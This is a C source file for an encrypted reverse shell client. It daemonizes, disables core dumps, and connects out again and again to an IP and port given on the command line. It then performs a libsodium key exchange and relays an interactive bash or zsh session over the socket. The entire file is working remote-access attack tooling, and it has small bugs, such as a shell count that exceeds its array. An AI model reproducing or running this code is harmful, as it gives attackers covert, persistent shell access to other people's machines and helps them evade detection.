
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include <arpa/inet.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <spawn.h>
#include <unistd.h>

#include <sodium.h>

#include "misc.h"
#include "logger.h"
#include "wrapper.h"

#define IP_LEN 16

bool brexit = false;

struct connection {
	char ip[IP_LEN];
	uint16_t port;

	struct sockaddr_in sin;
	int sock;
	struct crypto_ctx ctx;

	// shell fds
	int procin[2];
	int procout[2];

	int relayrv;
	bool exit;
};

int setupcon(struct connection *con)
{
	int rv;

	con->sock = socket(PF_INET, SOCK_STREAM, 0);
	if (con->sock < 0) {
		ERR(con->sock);
		return -1;
	}

	// setup input pipe
	rv = pipe(con->procin);
	if (rv) {
		ERR(rv);
		return -2;
	}

	rv = fcntl(con->procin[0], F_SETFL, O_NONBLOCK);
	if (rv) {
		ERR(rv);
		return -3;
	}

	rv = fcntl(con->procin[1], F_SETFL, O_NONBLOCK);
	if (rv) {
		ERR(rv);
		return -4;
	}

	// setup output pipe
	rv = pipe(con->procout);
	if (rv) {
		ERR(rv);
		return -5;
	}

	rv = fcntl(con->procout[0], F_SETFL, O_NONBLOCK);
	if (rv) {
		ERR(rv);
		return -6;
	}

	rv = fcntl(con->procout[1], F_SETFL, O_NONBLOCK);
	if (rv) {
		ERR(rv);
		return -7;
	}

	// set keepalive
	{
		int var = 1;
		socklen_t len = sizeof var;

		rv = setsockopt(con->sock, SOL_SOCKET, SO_KEEPALIVE, &var, len);
		if (rv) {
			return 9;
		}
	}

	con->relayrv = 0;
	con->exit = false;

	con->sin.sin_family = AF_INET;
	con->sin.sin_port = htons(con->port);
	con->sin.sin_addr.s_addr = inet_addr(con->ip);

	return 0;
}

int closecon(struct connection *con)
{
	int rv;

	rv = closepipe(con->procin);
	if (rv) {
		ERR(rv);
		return -1;
	}

	rv = closepipe(con->procout);
	if (rv) {
		ERR(rv);
		return -2;
	}

	rv = close(con->sock);
	if (rv) {
		ERR(rv);
		return -3;
	}
	return 0;
}

void *relay(void *data)
{
	int rv;
	int len;
	struct connection *con = (struct connection *)data;

	unsigned char buff[TRANS_BUFF_SIZE];

	con->relayrv = 0;

	rv = fcntl(con->sock, F_SETFL, O_NONBLOCK);
	if (rv) {
		ERR(rv);
		con->relayrv = 1;
		return NULL;
	}

	while (!con->exit) {
		memset(buff, 0, TRANS_BUFF_SIZE);

		// decrypt incomming cipher into buff
		len = recv_encrypted(con->sock, &con->ctx, buff);
		if (len > 0) {
			// if buffer is not empty write to pipe
			len = write(con->procin[1], buff, TRANS_BUFF_SIZE);
			if (len < 0) {
				con->relayrv = -2;
				return NULL;
			}
			LOG(1, "written:%s\n", buff);

		} else if (len < 0) {
			ERR(len);
		}

		memset(buff, 0, TRANS_BUFF_SIZE);

		// read from pipe
		len = read(con->procout[0], buff, TRANS_BUFF_SIZE);
		if (len < 0 && errno != EWOULDBLOCK && errno != EAGAIN) {
			con->relayrv = -3;
			return NULL;
		}

		if (len > 0) {
			rv = send_encrypted(con->sock, &con->ctx, buff);
			if (rv < 0) {
				ERR(rv);
			}
		}

		if (usleep(25000)) {
			con->relayrv = -4;
			return NULL;
		}
	}
	return NULL;
}

int spawnconsole(struct connection *con)
{
	int rv;
	size_t i;

	char *shells[] = { "/bin/bash", "/usr/bin/bash", "/bin/zsh",
			   "/usr/bin/zsh" };

	const size_t shells_size = 6;

	// Search for a working shell
	LOG(1, "Searching for shells...\n");
	for (i = 0; i < shells_size; i++) {
		if (access(shells[i], F_OK) == 0) {
			LOG(0, "Found shell %s!\n", shells[i]);
			break;
		}
		LOG(1, "Shell %s no good...\n", shells[i]);
	}

	if (i == shells_size) {
		LOG(-1, "No shell found!\n");
		return -1;
	}

	{
		pthread_t thread;
		pid_t pid;
		char *argv[] = { shells[i], "-i", NULL };

		pid = fork();
		if (pid == 0) {
			// As child
			LOG(1, "Closing unneeded fds...\n");
			if (close(con->procout[0]) | close(con->procin[1])) {
				return -1;
			}

			LOG(1, "Dupping i/o fds...\n");
			if (dup2(con->procin[0], STDIN_FILENO) < 0) {
				return -2;
			}

			if (dup2(con->procout[1], STDOUT_FILENO) < 0) {
				return -3;
			}

			if (dup2(con->procout[1], STDERR_FILENO) < 0) {
				return -4;
			}

			LOG(1, "Forking shell...\n");
			if (execv(shells[i], argv) < 0) {
				return -5;
			}

		} else if (pid < 0) {
			// On error
			return -7;
		}

		// Close unneeded fd's
		if (close(con->procout[1]) || close(con->procin[0])) {
			return -8;
		}

		// Create relay thread
		con->exit = false;
		if (pthread_create(&thread, NULL, relay, con)) {
			return -9;
		}
		LOG(0, "Created relay thread!\n");

		// Wait for shell to exit
		while (1) {
			if (con->exit) {
				// Try to kill the process
				rv = kill(pid, SIGKILL);
				if (rv) {
					ERR(rv);
					return -10;
				}
				LOG(1, "Killed shell!\n");
			}

			if (waitpid(pid, &rv, WNOHANG) >= 0) {
				if (WIFEXITED(rv)) {
					LOG(1, "Shell process returned %d\n",
					    WEXITSTATUS(rv));
					break;
				}
			} else {
				return -11;
			}

			if (usleep(25000)) {
				return -12;
			}
		}

		con->exit = true;
		if (pthread_join(thread, NULL)) {
			return -13;
		}
		LOG(1, "Relay thread returned %d\n", con->relayrv);
	}
	return 0;
}

static long int longparse(const char input[], char **end)
{
	long int num;
	errno = 0;

	num = strtol(input, end, 0);
	if (end != NULL) {
		if (*end == input) {
			return LLONG_MAX;
		}
	}

	if ((num == LLONG_MAX || num == LLONG_MIN) && errno == ERANGE) {
		return LLONG_MAX;
	}

	return num;
}

int argparse(int argc, char *argv[], struct connection *con)
{
	int i;

	con->port = 0;
	con->ip[0] = '\0';

	for (i = 0; i < argc; i++) {
		switch (argv[i][1]) {
		case 'i':
			if (i + 1 <= argc) {
				memcpy(con->ip, argv[i + 1], IP_LEN);
			} else {
				LOG(1, "Invalid IP Address given!\n");
			}
			break;

		case 'p':
			if (i + 1 <= argc) {
				long int temp;

				temp = longparse(argv[i + 1], NULL);
				if (temp > UINT16_MAX || temp < 1) {
					LOG(1,
					    "Invalid argument given to -p option\n");
					return 1;
				} else {
					con->port = temp;
				}
			}
			break;
		}
	}

	if (con->port == 0 || con->ip[0] == '\0') {
		LOG(1,
		    "Invalid argument provided!\n[ -p <port> -i <remote_IP> ]\n");
		return 1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	int rv;

	struct connection con;

	if (sodium_init()) {
		return -1;
	}

	// set coredump limit
	{
		struct rlimit limit;
		limit.rlim_cur = 0;
		limit.rlim_max = 0;

		rv = setrlimit(RLIMIT_CORE, &limit);
		if (rv) {
			ERR(rv);
			return -2;
		}
	}

	rv = argparse(argc, argv, &con);
	if (rv) {
		LOG(-1, "argparse:%d\n", rv);
		return -4;
	}

	// fork off like a daemon
#ifndef DEBUG
	rv = forkoff();
	if (rv) {
		LOG(-1, "forkoff: %d\n", rv);
		return -5;
	}
#endif

	// main loop
	{
		while (!brexit) {
			// setup a connection
			rv = setupcon(&con);
			if (rv) {
				LOG(-1, "setupcon:%d\n", rv);
				return -6;
			}

			// try to connect
			LOG(0, "Connecting to %s:%d\n", con.ip, con.port);
			rv = 1;
			while (rv) {
				rv = connect(con.sock,
					     (struct sockaddr *)&con.sin,
					     sizeof(con.sin));
				if (rv && errno != ECONNREFUSED &&
				    errno != EINPROGRESS) {
					dbprintf("connect: %s\n",
						 strerror(errno));
					return -7;
				}
			}
			LOG(0, "Connected!\n");

			// keyexchange between client and server
			rv = keyexchange(con.sock, &con.ctx, true);
			if (rv) {
				dbprintf("keyexchange:%d\n", rv);
				return -9;
			}
			LOG(0, "Authentication complete!\n");

			// spawn console / dups fds so that shell is usable over the sock
			rv = spawnconsole(&con);
			if (rv) {
				LOG(-1, "spawnconsole:%d\n", rv);
				return -10;
			}

			// close connection
			rv = closecon(&con);
			if (rv) {
				LOG(-1, "closecon:%d\n", rv);
				return -11;
			}

			if (usleep(25000)) {
				return -12;
			}
		}

		LOG(1, "Exiting!\n");
	}
	return 0;
}
